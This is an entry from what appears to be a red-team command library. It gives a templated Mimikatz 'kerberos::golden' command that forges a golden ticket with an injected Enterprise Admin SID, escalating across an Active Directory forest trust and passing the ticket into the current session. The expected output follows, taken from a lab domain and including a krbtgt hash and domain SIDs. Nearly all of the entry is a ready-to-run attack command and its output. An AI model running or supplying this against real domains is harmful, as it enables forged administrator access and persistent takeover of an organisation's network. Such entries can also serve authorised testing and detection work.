---
id: c598292d-2332-4b56-ae72-c2de84fdb7dc
name: Mimikatz Forge an Internal AD Forest Trust Ticket
type: command
executor: command_prompt
data: mimikatz.exe "kerberos::golden /domain:$_CHILD_DOMAIN /sid:$_CHILD_DOMAIN_SID
  /sids:$_ENTERPRISE_ADMIN_SID /user:Administrator /krbtgt:$_KRBTGT_NTLM /ptt" "exit"
output: "C:\\Windows\\System32\\spool\\drivers\\color>mimikatz.exe \"kerberos::golden\
  \ /domain:dev.tesla.local /sid:S-1-5-21-1576920733-1301476157-954876328 /sids:S-1-5-21-3428605742-3005092657-1212549955-519\
  \  /user:Administrator /krbtgt:832f0dd83dca633442171fde86a478cf /ptt\" \"exit\"\n\
  \n  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59\n .## ^ ##.  \"A\
  \ La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` (\
  \ benjamin@gentilkiwi.com )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n\
  \ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'\
  \        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz(commandline)\
  \ # kerberos::golden /domain:dev.tesla.local /sid:S-1-5-21-1576920733-1301476157-954876328\
  \ /sids:S-1-5-21-3428605742-3005092657-1212549955-519  /user:Administrator /krbtgt:832f0dd83dca633442171fde86a478cf\
  \ /ptt\nUser      : Administrator\nDomain    : dev.tesla.local (DEV)\nSID      \
  \ : S-1-5-21-1576920733-1301476157-954876328\nUser Id   : 500\nGroups Id : *513\
  \ 512 520 518 519\nExtra SIDs: S-1-5-21-3428605742-3005092657-1212549955-519 ;\n\
  ServiceKey: 832f0dd83dca633442171fde86a478cf - rc4_hmac_nt\nLifetime  : 7/20/2020\
  \ 3:05:04 PM ; 7/18/2030 3:05:04 PM ; 7/18/2030 3:05:04 PM\n-> Ticket : ** Pass\
  \ The Ticket **\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n\
  \ * EncTicketPart encrypted\n * KrbCred generated\n\nGolden ticket for 'Administrator\
  \ @ dev.tesla.local' successfully submitted for current session\n\nmimikatz(commandline)\
  \ # exit\nBye!"
created_at: '2020-07-20T22:27:56.255542+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Mimikatz Forge an Internal AD Forest Trust Ticket

```command_prompt
mimikatz.exe "kerberos::golden /domain:$_CHILD_DOMAIN /sid:$_CHILD_DOMAIN_SID /sids:$_ENTERPRISE_ADMIN_SID /user:Administrator /krbtgt:$_KRBTGT_NTLM /ptt" "exit"
```

## Expected Output

```
C:\Windows\System32\spool\drivers\color>mimikatz.exe "kerberos::golden /domain:dev.tesla.local /sid:S-1-5-21-1576920733-1301476157-954876328 /sids:S-1-5-21-3428605742-3005092657-1212549955-519  /user:Administrator /krbtgt:832f0dd83dca633442171fde86a478cf /ptt" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # kerberos::golden /domain:dev.tesla.local /sid:S-1-5-21-1576920733-1301476157-954876328 /sids:S-1-5-21-3428605742-3005092657-1212549955-519  /user:Administrator /krbtgt:832f0dd83dca633442171fde86a478cf /ptt
User      : Administrator
Domain    : dev.tesla.local (DEV)
SID       : S-1-5-21-1576920733-1301476157-954876328
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3428605742-3005092657-1212549955-519 ;
ServiceKey: 832f0dd83dca633442171fde86a478cf - rc4_hmac_nt
Lifetime  : 7/20/2020 3:05:04 PM ; 7/18/2030 3:05:04 PM ; 7/18/2030 3:05:04 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ dev.tesla.local' successfully submitted for current session

mimikatz(commandline) # exit
Bye!
```


